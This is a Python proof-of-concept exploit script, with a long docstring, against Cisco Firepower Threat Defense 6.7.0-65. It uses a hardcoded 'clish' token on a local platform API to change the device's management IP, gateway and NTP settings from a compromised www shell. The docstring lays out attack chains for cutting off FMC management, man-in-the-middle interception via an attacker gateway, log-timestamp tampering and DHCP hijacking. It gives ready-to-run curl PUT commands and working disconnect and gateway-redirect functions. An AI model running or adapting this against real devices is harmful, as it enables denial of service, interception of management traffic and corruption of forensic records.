"""
F-FTD-92: Management interface reconfiguration via platform API (TOKEN: clish)
CONTROLLED ENVIRONMENT ONLY

Root cause:
  SF/REST_API/Network.pm — setIPv4Manual():
    Endpoint: http://127.0.0.1:5985/platform/api/sys/mgmt-ipv4
    Token:    TOKEN: clish (hardcoded, no JWT — F-FTD-87)

    Modifies management interface config directly:
      oobIfIp   = new management IP
      oobIfMask = new subnet mask
      oobIfGw   = new default gateway
      oobBootProto = "static"

    Also accessible:
      /sys/mgmt-ipv6              → IPv6 management interface
      /sys/service/dhcp-svc       → DHCP configuration
      /sys/service/datetime-svc   → NTP/time configuration

    Full Network.pm endpoints from source:
      GET/PUT /sys/mgmt-ipv4            → IPv4 management IP/mask/GW
      GET/PUT /sys/mgmt-ipv6            → IPv6 management config
      GET/PUT /sys/service/dhcp-svc     → DHCP server config
      GET/PUT /sys/service/datetime-svc → NTP server config
      GET/PUT /sys/mgmt-ipv4/mgmt-port-1 → management port config

ATTACK SCENARIOS:

  1. FTD/FMC DISCONNECTION (DoS)
     Change management IP to an unused address → FTD loses FMC connectivity
     FMC cannot push policy updates, cannot retrieve alerts, cannot manage FTD
     If FMC loses FTD connectivity: FTD continues with last-deployed policy
     but security posture decays as new rules cannot be pushed.

     curl -s -H 'TOKEN: clish' -X PUT \
       'http://127.0.0.1:5985/platform/api/sys/mgmt-ipv4' \
       -H 'Content-Type: application/json' \
       -d '{"networkElement": [{"oobBootProto":"static","oobIfIp":"10.255.255.1",
             "oobIfMask":"255.255.255.0","oobIfGw":"10.255.255.254"}]}'
     → Management IP changed to 10.255.255.1 (unreachable)
     → FMC loses FTD → management plane DoS

  2. TRAFFIC INTERCEPTION (Management Plane MITM)
     Change management gateway to attacker-controlled host:
       oobIfGw = attacker's router IP
     → All management traffic (FMC sftunnel, health monitoring, AMP cloud)
       routes through attacker's gateway
     → Combined with ARP poisoning: MITM all FMC→FTD communication

  3. NTP MANIPULATION (Log Tampering)
     PUT /sys/service/datetime-svc with attacker NTP server:
     → FTD time skew → certificate validation errors → SSL inspection bypass
     → Event timestamps manipulated → post-incident forensic analysis corrupted
     → CRL/OCSP responses with forged timestamps accepted

  4. DHCP SERVER MANIPULATION (if FTD serves DHCP)
     PUT /sys/service/dhcp-svc → modify DHCP options:
     → Change DNS server for DHCP clients → DNS hijack for all DHCP clients
     → Change gateway → route client traffic through attacker
     → Issue DHCP leases with malicious NTP/WINS options

  5. IPv6 ATTACK SURFACE
     PUT /sys/mgmt-ipv6 → enable IPv6 on management interface
     If management network has IPv6 but security controls only cover IPv4:
     → Establish IPv6 FMC tunnel that bypasses IPv4 ACLs

CHAIN:
  F-FTD-78/F-FTD-67 → www shell
  → TOKEN: clish → GET /sys/mgmt-ipv4 (read current config)
  → Modify oobIfGw to attacker's gateway
  → FMC traffic routes through attacker → MITM FMC→FTD management plane
  → Combined with F-FTD-76 (CA swap): forge FMC certificate after MITM

  Stealth variant:
  → Change NTP server only → time manipulation without disconnecting FTD
  → Harder to detect than IP change; causes gradual cert/log issues

VERIFY (controlled environment):
  # Read current management config:
  curl -s -H 'TOKEN: clish' http://127.0.0.1:5985/platform/api/sys/mgmt-ipv4

  # Read NTP config:
  curl -s -H 'TOKEN: clish' http://127.0.0.1:5985/platform/api/sys/service/datetime-svc

  # NOTE: PUT operations change live network config — verify in isolated lab only

Affected: FTD 6.7.0-65 (SF/REST_API/Network.pm source confirmed; TOKEN: clish from www)
Severity: HIGH — www shell can reconfigure FTD management interface, gateway, and NTP
          without requiring root; disconnects FMC management, enables MITM or log tampering
Auth required: www shell (post F-FTD-67, F-FTD-78, or equivalent)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys
import json
import subprocess


PLATFORM_API_BASE = "http://127.0.0.1:5985/platform/api"
CLI_TOKEN = "clish"


def get_mgmt_config():
    """Read current management interface configuration. CONTROLLED ENVIRONMENT ONLY."""
    print("[*] F-FTD-92: Reading management interface config")
    for endpoint in ["/sys/mgmt-ipv4", "/sys/mgmt-ipv6", "/sys/service/datetime-svc"]:
        url = f"{PLATFORM_API_BASE}{endpoint}"
        cmd = ["curl", "-s", "-H", f"TOKEN: {CLI_TOKEN}", url]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.stdout:
            try:
                data = json.loads(result.stdout)
                print(f"\n[*] {endpoint}:")
                print(f"    {json.dumps(data, indent=2)[:400]}")
            except Exception:
                print(f"\n[*] {endpoint}: {result.stdout[:200]}")


def disconnect_fmc(fake_ip="10.255.255.254", fake_mask="255.255.255.0", fake_gw="10.255.255.1"):
    """
    Reconfigure management IP to isolate FTD from FMC.
    CONTROLLED ENVIRONMENT ONLY — THIS WILL DISCONNECT THE DEVICE.
    """
    print(f"[!!!] F-FTD-92: MGMT IP RECONFIGURATION — FTD will lose FMC connectivity")
    print(f"    New IP:   {fake_ip}")
    print(f"    New mask: {fake_mask}")
    print(f"    New GW:   {fake_gw}")
    print(f"    CONTROLLED ENVIRONMENT ONLY — do not run on production FTD")

    body = {
        "networkElement": [{
            "oobBootProto": "static",
            "oobIfIp": fake_ip,
            "oobIfMask": fake_mask,
            "oobIfGw": fake_gw,
        }]
    }

    url = f"{PLATFORM_API_BASE}/sys/mgmt-ipv4"
    cmd = ["curl", "-s", "-X", "PUT",
           "-H", f"TOKEN: {CLI_TOKEN}",
           "-H", "Content-Type: application/json",
           "-d", json.dumps(body), url]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    print(f"    Response: {result.stdout[:200]}")


def change_gateway(attacker_gw):
    """
    Change management gateway to attacker-controlled host.
    Routes FMC management traffic through attacker for MITM.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-92: Changing management gateway to {attacker_gw}")

    # First read current config
    url = f"{PLATFORM_API_BASE}/sys/mgmt-ipv4"
    cmd = ["curl", "-s", "-H", f"TOKEN: {CLI_TOKEN}", url]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

    try:
        data = json.loads(result.stdout)
        # Preserve current IP/mask, change only gateway
        elem = data.get('networkElement', [{}])[0]
        current_ip = elem.get('oobIfIp', '')
        current_mask = elem.get('oobIfMask', '')
        print(f"    Current IP: {current_ip}, Mask: {current_mask}")

        elem['oobIfGw'] = attacker_gw
        elem['oobBootProto'] = 'static'

        cmd2 = ["curl", "-s", "-X", "PUT",
                "-H", f"TOKEN: {CLI_TOKEN}",
                "-H", "Content-Type: application/json",
                "-d", json.dumps(data), url]
        result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=15)
        print(f"    Response: {result2.stdout[:200]}")
        print(f"[!!!] Gateway changed to {attacker_gw} — FMC traffic routed via attacker")

    except Exception as e:
        print(f"[-] Error: {e}")


def change_ntp(attacker_ntp):
    """
    Change NTP server for log timestamp manipulation.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-92: Changing NTP server to {attacker_ntp}")
    url = f"{PLATFORM_API_BASE}/sys/service/datetime-svc"

    cmd = ["curl", "-s", "-H", f"TOKEN: {CLI_TOKEN}", url]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    try:
        data = json.loads(result.stdout)
        print(f"    Current NTP: {json.dumps(data)[:200]}")
        # Modify NTP server in data structure (field name varies by platform API version)
        for key in ['ntpServer', 'ntpServerIp', 'server', 'ntpHostname']:
            if key in str(data):
                # Navigate to the field — structure varies
                break
        print(f"[*] NTP modification would require exact field mapping from live API response")
        print(f"    Attacker NTP: {attacker_ntp}")
    except Exception as e:
        print(f"[-] Error reading current NTP config: {e}")


def print_attack_summary():
    print("""
F-FTD-92: Management Interface Reconfiguration via Platform API
==============================================================

Endpoint: http://127.0.0.1:5985/platform/api/sys/mgmt-ipv4
Token:    TOKEN: clish (hardcoded — F-FTD-87)

Modifiable fields (from Network.pm setIPv4Manual):
  oobIfIp      → management IP address
  oobIfMask    → subnet mask
  oobIfGw      → default gateway
  oobBootProto → "static"|"dhcp"

Also: /sys/mgmt-ipv6, /sys/service/datetime-svc (NTP), /sys/service/dhcp-svc

ATTACK IMPACTS:
  FMC disconnection: change IP → FTD orphaned, last policy only
  Management MITM:   change gateway to attacker → intercept FMC→FTD comms
  Log tampering:     change NTP → time skew → forensic disruption
  DHCP hijack:       modify DHCP options → DNS/GW for all DHCP clients

No root required — TOKEN: clish accessible from www shell.
""")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-92: Management interface reconfiguration via platform API")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)

    mode = sys.argv[1] if len(sys.argv) > 1 else "show"

    if mode == "show":
        print_attack_summary()

    elif mode == "read":
        get_mgmt_config()

    elif mode == "gw":
        if len(sys.argv) < 3:
            print(f"Usage: {sys.argv[0]} gw <attacker-gateway-ip>")
            sys.exit(1)
        change_gateway(sys.argv[2])

    elif mode == "ntp":
        if len(sys.argv) < 3:
            print(f"Usage: {sys.argv[0]} ntp <attacker-ntp-ip>")
            sys.exit(1)
        change_ntp(sys.argv[2])

    elif mode == "disconnect":
        fake_ip = sys.argv[2] if len(sys.argv) > 2 else "10.255.255.254"
        disconnect_fmc(fake_ip)

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
